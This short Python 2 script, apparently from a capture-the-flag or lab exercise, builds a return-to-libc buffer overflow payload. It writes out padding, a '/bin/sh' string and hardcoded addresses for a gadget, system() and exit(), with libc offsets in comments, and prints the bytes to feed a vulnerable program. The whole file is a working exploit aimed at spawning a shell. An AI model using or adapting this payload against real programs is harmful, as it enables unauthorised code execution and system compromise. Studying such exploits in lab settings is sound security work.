from struct import pack

def p(x):
    return pack('<Q', x)

payload = ''
payload += '\x00' * 56
payload += "/bin/sh\x00"
payload += p(0x7fffffffdff8)#libc: 7ffff7dcd000
payload += p(0x7ffff7df0b72) #gadget: 23b72
payload += p(0x7fffffffdfc8) #addr of /bin/sh
payload += p(0x7ffff7e1f2c0) #system: 522c0
payload += p(0x7ffff7e13a70) #exit:   46a70

print payload